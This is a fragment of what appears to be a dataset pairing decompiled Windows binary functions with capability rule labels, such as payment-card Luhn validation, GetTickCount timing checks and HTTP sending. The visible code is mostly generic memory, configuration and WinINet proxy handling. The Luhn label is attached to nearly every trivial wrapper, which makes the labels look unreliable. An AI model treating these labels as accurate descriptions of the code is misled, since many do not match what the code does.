            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2001916e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.200190f3(arg_8h, arg_ch, 0);\n    if (iVar1 == 0) {\n        fcn.20018f63(arg_8h, arg_10h, arg_14h, arg_18h, 0);\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "2001919c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2001919c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    sub.ntdll.dll_memset(&var_10h, 0, 0x10);\n    var_8h = arg_10h;\n    var_ch = arg_ch;\n    fcn.200190f3(arg_8h, &var_10h, arg_14h);\n    return;\n}\n",
        "token_count": 121
    },
    "200191cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.200191cf(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    sub.ntdll.dll_memset(&var_10h, 0, 0x10);\n    var_8h = arg_10h;\n    var_ch = arg_ch;\n    fcn.2001916e(arg_8h, &var_10h, arg_14h, arg_18h, arg_1ch);\n    return;\n}\n",
        "token_count": 148
    },
    "2001976e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001976e(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_84h;\n    uint var_4h;\n    \n    var_4h = arg_ch;\n    iVar1 = fcn.20023757(&var_4h, &var_84h, 0x80, &arg_ch);\n    while (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ntdll.dll__stricmp)(&var_84h, \"ustart\");\n        if (iVar1 == 0) {\n            uVar2 = fcn.200237e9(arg_ch, arg_8h + 0x90);\n            *(arg_8h + 0x8c) = uVar2;\n        }\n        iVar1 = fcn.20023757(&var_4h, &var_84h, 0x80, &arg_ch);\n    }\n    return 0;\n}\n",
        "token_count": 221
    },
    "2001a239": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2001a239(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (*(arg_8h + 0x1c) != 0) {\n        fcn.2001a1f9(arg_ch, arg_10h, arg_14h, arg_8h + 0x28, *(arg_8h + 0xa8), 0, arg_8h + 0xac, 0, \n                     -(*(arg_8h + 4) != 0) & arg_8h + 8U, 1);\n        return;\n    }\n    fcn.2001a1f9(arg_ch, arg_10h, arg_14h, arg_8h + 0x28, *(arg_8h + 0xa8), 0, arg_8h + 0xac, 0, 0, 0);\n    return;\n}\n",
        "token_count": 217
    },
    "2001a2a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001a2a5(int32_t arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t arg_1ch;\n    int32_t iVar1;\n    \n    arg_1ch = arg_14h;\n    sub.ntdll.dll_memset(arg_14h, 0, 0x90);\n    iVar1 = fcn.2001a1f9(arg_ch, arg_10h, arg_18h, 0, 0, arg_1ch, 0, &arg_8h, -(*(arg_8h + 4) != 0) & arg_8h + 8U, 0);\n    if (iVar1 == 0) {\n        *(arg_1ch + 0x80) = arg_8h;\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 212
    },
    "2001a76c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001a76c(int32_t arg_8h, char *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_84h;\n    char *var_4h;\n    \n    var_4h = arg_ch;\n    iVar2 = fcn.20023757(&var_4h, &var_84h, 0x80, &arg_ch);\n    pcVar1 = _sym.imp.ntdll.dll_toupper;\n    do {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        iVar2 = (*_sym.imp.ntdll.dll__stricmp)(&var_84h, \"dns_ignore_errors\");\n        if (iVar2 == 0) {\n            iVar2 = (*pcVar1)(*arg_ch);\n            if ((iVar2 == 0x59) || (*arg_ch == '1')) {\n                *(arg_8h + 0x10) = 1;\n            }\n            else {\n                iVar2 = (*pcVar1)(*arg_ch);\n                if ((iVar2 != 0x4e) && (*arg_ch != '1')) {\n                    return 0x21590066;\n                }\n                *(arg_8h + 0x10) = 0;\n            }\n        }\n        iVar2 = fcn.20023757(&var_4h, &var_84h, 0x80, &arg_ch);\n    } while( true );\n}\n",
        "token_count": 321
    },
    "2001a823": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.2001a823(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = sub.ntdll.dll_strlen(param_1);\n        iVar1 = (*_sym.imp.msvcrt.dll_calloc)(1, iVar1 + 1);\n        if (iVar1 != 0) {\n            sub.ntdll.dll_strcpy(iVar1, param_1);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 121
    },
    "2001a9a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.2001a9a6(uint src, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar *dest_00;\n    uchar var_810h;\n    uint var_80fh;\n    uchar dest;\n    uint s;\n    uint var_ch;\n    int32_t var_8h;\n    uchar *s1;\n    \n    var_8h = 0;\n    dest = 0;\n    sub.ntdll.dll_memset(&s, 0, 0x400);\n    var_810h = 0;\n    sub.ntdll.dll_memset(&var_80fh, 0, 0x400);\n    s1 = &dest;\n    (*_sym.imp.ntdll.dll_strncpy)(s1, src, 0x400);\n    var_ch._0_1_ = 0;\n    iVar1 = fcn.2001a8ff(src, arg_ch, arg_10h, arg_14h, &var_810h, arg_1ch);\n    puVar3 = &var_810h;\n    if (iVar1 == 0) {\n        do {\n            dest_00 = puVar3;\n            if (*arg_1ch != 0) break;\n            iVar1 = sub.ntdll.dll_strlen(puVar3);\n            if (((iVar1 == 0) || (iVar1 = sub.ntdll.dll_strcmp(s1, puVar3),  dest_00 = s1,  iVar1 == 0)) ||\n               (var_8h = var_8h + 1,  var_8h == 0x10)) {\n                iVar1 = 0x2afb;\n                dest_00 = puVar3;\n                break;\n            }\n            s1 = puVar3;\n            iVar1 = fcn.2001a8ff(src, arg_ch, arg_10h, arg_14h, dest_00, arg_1ch);\n            puVar3 = dest_00;\n        } while (iVar1 == 0);\n        if ((iVar1 == 0) && (arg_18h != 0)) {\n            uVar2 = fcn.2001a823(dest_00);\n            *(*arg_1ch + 0x14) = uVar2;\n            if (*(*arg_1ch + 0x14) == 0) {\n                iVar1 = 8;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 580
    },
    "2001b54e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2001b54e(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    do {\n        iVar1 = fcn.20023632(*(arg_8h + 4), arg_ch, arg_10h, arg_18h, arg_14h);\n    } while (iVar1 == 0x2746);\n    return;\n}\n",
        "token_count": 108
    },
    "2001b82a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.2001b82a(uint32_t param_1)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *unaff_ESI;\n    \n    if (in_EAX == 0) {\n        (*_sym.imp.msvcrt.dll_free)(*unaff_ESI);\n        *unaff_ESI = 0;\n        return 0;\n    }\n    iVar1 = (*_sym.imp.msvcrt.dll_malloc)();\n    if (iVar1 == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        if (param_1 <= in_EAX) {\n            in_EAX = param_1;\n        }\n        sub.ntdll.dll_memcpy(iVar1, *unaff_ESI, in_EAX);\n        (*_sym.imp.msvcrt.dll_free)(*unaff_ESI);\n        *unaff_ESI = iVar1;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 218
    },
    "2001b879": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.2001b879(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.msvcrt.dll_malloc)(0x60);\n    if (iVar1 == 0) {\n        iVar2 = 0x21590004;\n    }\n    else {\n        sub.ntdll.dll_memset(iVar1, 0, 0x60);\n        var_4h = 0;\n        var_8h = arg_ch;\n        iVar2 = fcn.2001300b(iVar1 + 4, &var_8h, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (iVar2 == 0) {\n            *(iVar1 + 0x10) = 0;\n            *(iVar1 + 0xc) = 0x1000000;\n            fcn.20001551(iVar1 + 0x2c);\n            fcn.20001551(iVar1 + 0x44);\n            *arg_8h = iVar1;\n            iVar2 = 0;\n        }\n        else {\n            (*_sym.imp.msvcrt.dll_free)(iVar1);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 336
    },
    "2001b918": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2001b918(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    \n    iVar1 = arg_8h;\n    iVar3 = fcn.2001348f(*(arg_8h + 4), arg_ch);\n    if (iVar3 == 0) {\n        *(iVar1 + 8) = 1;\n        if (*(iVar1 + 0x28) != 0) {\n            arg_8h = CONCAT31(arg_8h._1_3_, 1);\n            uVar2 = (*_sym.imp.WS2_32.dll_htons)(*(iVar1 + 0x28));\n            arg_8h._0_3_ = CONCAT21(uVar2, arg_8h);\n            arg_8h = arg_8h & 0xff000000 | arg_8h;\n            sub.ntdll.dll_memset(&var_20h, 0, 0x20);\n            var_18h = 3;\n            var_8h = 3;\n            var_20h = &var_10h;\n            var_ch = &arg_8h;\n            var_1ch = 0x2002fc08;\n            fcn.20013845(*(iVar1 + 4), &var_20h, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 354
    },
    "2001b98f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001b98f(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = arg_8h;\n    iVar2 = fcn.20013311(*(arg_8h + 4), &arg_8h, arg_10h);\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x60);\n        if (iVar2 == 0) {\n            iVar2 = 0x21590004;\n        }\n        else {\n            sub.ntdll.dll_memset(iVar2, 0, 0x60);\n            *(iVar2 + 4) = arg_8h;\n            *(iVar2 + 0xc) = *(iVar1 + 0xc);\n            *(iVar2 + 0x10) = *(iVar1 + 0x10);\n            sub.ntdll.dll_memcpy(iVar2 + 0x14, iVar1 + 0x14, 0x10);\n            *(iVar2 + 0x24) = *(iVar1 + 0x24);\n            fcn.20001551(iVar2 + 0x2c);\n            fcn.20001551(iVar2 + 0x44);\n            *(iVar2 + 8) = 1;\n            *arg_ch = iVar2;\n            iVar2 = 0;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 333
    },
    "2001ba6a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2001ba6a(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.2001372c(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n    return;\n}\n",
        "token_count": 82
    },
    "2001bb93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __fastcall fcn.2001bb93(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *unaff_ESI;\n    int32_t iVar5;\n    \n    iVar4 = unaff_ESI[2];\n    iVar3 = (*(param_1 + 0x10) + *(param_1 + 0xc)) / 2;\n    if ((iVar4 <= iVar3) || (iVar5 = iVar3,  iVar3 <= iVar4 + (iVar4 >> 0x1f & 3U) >> 2)) {\n        iVar5 = iVar4 / 2;\n    }\n    iVar4 = iVar4 - iVar5;\n    if ((0x400 < iVar5) && (iVar4 + 0x400 <= iVar3)) {\n        iVar4 = fcn.200018bf();\n        iVar5 = iVar5 - iVar4 % 0x401;\n        iVar4 = unaff_ESI[2] - iVar5;\n    }\n    if ((0x400 < iVar4) && (iVar5 + 0x400 <= iVar3)) {\n        iVar3 = fcn.200018bf();\n        iVar4 = iVar4 - iVar3 % 0x401;\n        iVar5 = unaff_ESI[2] - iVar4;\n    }\n    puVar1 = (*_sym.imp.msvcrt.dll_malloc)(0x10);\n    if (puVar1 == NULL) {\n        uVar2 = 0x21590004;\n    }\n    else {\n        sub.ntdll.dll_memset(puVar1, 0, 0x10);\n        puVar1[2] = iVar4;\n        puVar1[3] = unaff_ESI[3];\n        puVar1[1] = unaff_ESI[1] + iVar5;\n        unaff_ESI[2] = iVar5;\n        *puVar1 = *unaff_ESI;\n        *unaff_ESI = puVar1;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 463
    },
    "2001bc6e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.2001bc6e(void)\n\n{\n    uint uVar1;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint s2;\n    uint var_4h;\n    \n    var_4h = *unaff_ESI;\n    uVar1 = *unaff_EDI;\n    sub.ntdll.dll_memcpy(&s2);\n    sub.ntdll.dll_memcpy();\n    sub.ntdll.dll_memcpy();\n    *unaff_EDI = uVar1;\n    *unaff_ESI = var_4h;\n    return;\n}\n",
        "token_count": 122
    },
    "2001bf2b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001bf2b(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t **arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    int32_t *unaff_EBX;\n    int32_t **var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if (arg_10h == 0) {\n        piVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x10);\n        if (piVar2 == NULL) {\n            fcn.2001bc57();\n            *arg_14h = NULL;\n            return 0x21590004;\n        }\n        sub.ntdll.dll_memset(piVar2, 0, 0x10);\n        *arg_14h = piVar2;\n        *unaff_EBX = 1;\n    }\n    else {\n        *arg_14h = NULL;\n        *unaff_EBX = 0;\n        var_8h = NULL;\n        if (0 < arg_10h) {\n            do {\n                piVar2 = *(arg_8h + 0xc);\n                piVar1 = *(arg_8h + 0x10);\n                if (piVar2 == piVar1) {\n                    if (0x3ff < piVar2 - piVar1) {\n                        iVar3 = fcn.200018bf();\n                        piVar2 = *(arg_8h + 0xc) - iVar3 % 0x401;\n                    }\n                }\n                else {\n                    iVar3 = fcn.200018bf();\n                    piVar2 = iVar3 % ((*(arg_8h + 0xc) - piVar1) + 1) + piVar1;\n                }\n                if (arg_10h - var_4h < piVar2) {\n                    piVar2 = arg_10h - var_4h;\n                }\n                ppiVar4 = (*_sym.imp.msvcrt.dll_malloc)(0x10);\n                if (ppiVar4 == NULL) {\n                    fcn.2001bc57();\n                    *arg_14h = NULL;\n                    return 0x21590004;\n                }\n                sub.ntdll.dll_memset(ppiVar4, 0, 0x10);\n                ppiVar4[1] = arg_ch + var_4h;\n                ppiVar4[2] = piVar2;\n                if (var_8h == NULL) {\n                    var_8h = arg_14h;\n                }\n                var_4h = var_4h + piVar2;\n                *var_8h = ppiVar4;\n                *unaff_EBX = *unaff_EBX + 1;\n                var_8h = ppiVar4;\n            } while (var_4h < arg_10h);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 666
    },
    "2001c64e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.2001c64e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.2001c0ae(arg_8h, arg_ch, arg_10h, 0);\n    if (iVar1 == 0) {\n        fcn.2001c35c(arg_8h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "2001c6b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001c6b9(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = arg_8h;\n    iVar2 = fcn.20013311(*(arg_8h + 4), &arg_8h, arg_10h);\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0xb4);\n        if (iVar2 == 0) {\n            iVar2 = 0x21590004;\n        }\n        else {\n            sub.ntdll.dll_memset(iVar2, 0, 0xb4);\n            *(iVar2 + 4) = arg_8h;\n            fcn.20001551(iVar2 + 0x70);\n            fcn.20001551(iVar2 + 0x30);\n            fcn.20001551(iVar2 + 0x18);\n            fcn.200012fa(iVar2 + 0x90);\n            *(iVar2 + 8) = 1;\n            *(iVar2 + 0x10) = 1;\n            *(iVar2 + 0x5c) = *(iVar1 + 0x5c);\n            *(iVar2 + 0x60) = *(iVar1 + 0x60);\n            *(iVar2 + 100) = *(iVar1 + 100);\n            *(iVar2 + 0x68) = *(iVar1 + 0x68);\n            *(iVar2 + 0x6c) = *(iVar1 + 0x6c);\n            *(iVar2 + 0x48) = *(iVar1 + 100);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            *(iVar2 + 0xb0) = uVar3;\n            *(iVar2 + 0xac) = uVar3;\n            *arg_ch = iVar2;\n            iVar2 = 0;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 462
    },
    "2001c831": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.2001c831(int32_t param_1, int32_t param_2)\n\n{\n    fcn.20013299(*(param_1 + 4), param_2 + -3);\n    return;\n}\n",
        "token_count": 50
    },
    "2001cfc9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.2001cfc9(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t var_18h;\n    code *var_14h;\n    code *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = (*_sym.imp.msvcrt.dll_malloc)(0xb4);\n    if (iVar1 == 0) {\n        var_4h = 0x21590004;\n    }\n    else {\n        sub.ntdll.dll_memset(iVar1, 0, 0xb4);\n        var_ch = arg_ch;\n        var_8h = 0;\n        var_4h = fcn.2001300b(iVar1 + 4, &var_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (var_4h == 0) {\n            if ((arg_10h != 0) && (arg_18h == 0)) {\n                var_14h = fcn.2001c9e4;\n                var_10h = fcn.2001ca1d;\n                var_18h = iVar1;\n                fcn.200136d0(*(iVar1 + 4), 6, &var_18h, 0xc, 0);\n            }\n            *(iVar1 + 0x5c) = 5;\n            *(iVar1 + 0x60) = 30000;\n            *(iVar1 + 100) = 1000;\n            *(iVar1 + 0x68) = 4;\n            if (arg_18h != 0) {\n                *(iVar1 + 0x6c) = 1;\n            }\n            fcn.20001551(iVar1 + 0x70);\n            fcn.20001551(iVar1 + 0x30);\n            fcn.20001551(iVar1 + 0x18);\n            fcn.200012fa(iVar1 + 0x90);\n            *arg_8h = iVar1;\n            var_4h = 0;\n        }\n        else {\n            (*_sym.imp.msvcrt.dll_free)(iVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 553
    },
    "2001d293": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.2001d293(int32_t param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0xc) != 0) {\n        return 0x21590006;\n    }\n    if (*(param_1 + 8) == 0) {\n        return 0x21590003;\n    }\n    uVar1 = fcn.2001d0c4(2, 0, param_2, param_3, param_4);\n    return uVar1;\n}\n",
        "token_count": 131
    },
    "2001d416": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.2001d416(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.2001d2c7(param_2, param_3, 8);\n    return;\n}\n",
        "token_count": 50
    },
    "2001d42d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001d42d(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = arg_8h + 0x18;\n    fcn.20001567(iVar1);\n    iVar2 = arg_8h + 0x30;\n    fcn.20001567(iVar2);\n    iVar3 = fcn.2001d416(arg_8h, arg_ch, 0);\n    if (iVar3 == 0) {\n        iVar3 = fcn.2001d293(arg_8h, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    arg_8h = iVar3;\n    fcn.2000157d(iVar2);\n    fcn.2000157d(iVar1);\n    return arg_8h;\n}\n",
        "token_count": 234
    },
    "2001d60b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2001d60b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    sub.ntdll.dll_memset(&var_10h, 0, 0x10);\n    var_10h = 0;\n    var_ch = arg_ch;\n    var_8h = arg_10h;\n    fcn.2001d2c7(&var_10h, arg_14h, 8);\n    return;\n}\n",
        "token_count": 131
    },
    "2001d644": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.2001d644(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    sub.ntdll.dll_memset(&var_10h, 0, 0x10);\n    var_10h = 0;\n    var_ch = arg_ch;\n    var_8h = arg_10h;\n    fcn.2001d42d(arg_8h, &var_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    return;\n}\n",
        "token_count": 164
    },
    "2001e3e7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001e3e7(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_ch == 3) {\n        if (arg_14h != 4) {\n            return 0x21590064;\n        }\n        iVar1 = sub.ntdll.dll_strlen(*(arg_8h + 4));\n        *arg_10h = iVar1 + 1;\n    }\n    else {\n        if (arg_ch != 4) {\n            return 0x21590001;\n        }\n        (*_sym.imp.ntdll.dll_strncpy)(arg_10h, *(arg_8h + 4), arg_14h);\n        *(arg_10h + arg_14h + -1) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 200
    },
    "2001e446": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2001e446(uint noname_0, int32_t *arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    if (arg_10h == 0x3c) {\n        arg_ch[3] = *arg_14h;\n    }\n    else if (arg_10h == 100) {\n        if (*arg_14h == 0) {\n            *arg_ch = arg_14h[1];\n            arg_ch[5] = 0;\n        }\n        else {\n            *arg_ch = 0;\n            arg_ch[5] = arg_14h[1];\n        }\n        fcn.200012c9(arg_ch + 1);\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "2001e876": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001e876(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint s;\n    uint var_14h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 4;\n    iVar2 = (*_sym.imp.WININET.dll_HttpQueryInfoA)(arg_8h, 0x20000013, &var_8h, &var_4h, 0);\n    pcVar1 = _sym.imp.WININET.dll_InternetSetOptionA;\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else if (var_8h == 0x197) {\n        iVar2 = *(in_EAX + 0x5c);\n        if ((iVar2 == 0) && (*(in_EAX + 0x60) == 0)) {\n            sub.ntdll.dll_memset(&s, 0, 0x10);\n            var_ch = &s;\n            s = 0x10;\n            var_14h = 0x2001e441;\n            uVar3 = (*_sym.imp.USER32.dll_GetDesktopWindow)(arg_8h, 0, 0x17, &var_ch);\n            iVar2 = (*_sym.imp.WININET.dll_InternetErrorDlg)(uVar3);\n            iVar2 = (-(iVar2 != 0x2f00) & 0xfffffed7) + 0x2159012c;\n        }\n        else {\n            if (iVar2 != 0) {\n                iVar2 = sub.ntdll.dll_strlen(iVar2);\n                (*pcVar1)(*(in_EAX + 0x10), 0x2b, *(in_EAX + 0x5c), iVar2 + 1);\n            }\n            if (*(in_EAX + 0x60) != 0) {\n                iVar2 = sub.ntdll.dll_strlen(*(in_EAX + 0x60));\n                (*pcVar1)(*(in_EAX + 0x10), 0x2c, *(in_EAX + 0x60), iVar2 + 1);\n            }\n            iVar2 = 0x2159012c;\n        }\n    }\n    else {\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 548
    },
    "2001e958": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "send data",
            "send HTTP request",
            "connect to HTTP server"
        ],
